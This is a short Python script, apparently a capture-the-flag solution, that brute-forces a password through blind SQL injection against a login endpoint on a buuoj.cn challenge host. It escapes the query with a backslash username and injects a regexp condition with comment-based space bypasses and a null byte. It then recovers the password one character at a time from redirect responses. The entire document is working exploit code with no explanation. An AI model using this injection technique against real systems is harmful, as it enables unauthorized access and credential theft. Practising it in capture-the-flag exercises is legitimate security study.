import requests
import string
from urllib import parse
a=string.ascii_lowercase+string.digits+"_"
url="http://984d6088-0d0a-4c63-aca4-16e13de6ca94.node4.buuoj.cn:81"
b=""
while True:
    for i in a:
        data={"username":"\\","passwd":'||passwd/**/regexp/**/"^'+b+i+'";'+parse.unquote("%00")}
        r=requests.post(url,data=data,allow_redirects=False)
        if "Location" in r.headers:
            b+=i
            print(b)
            break
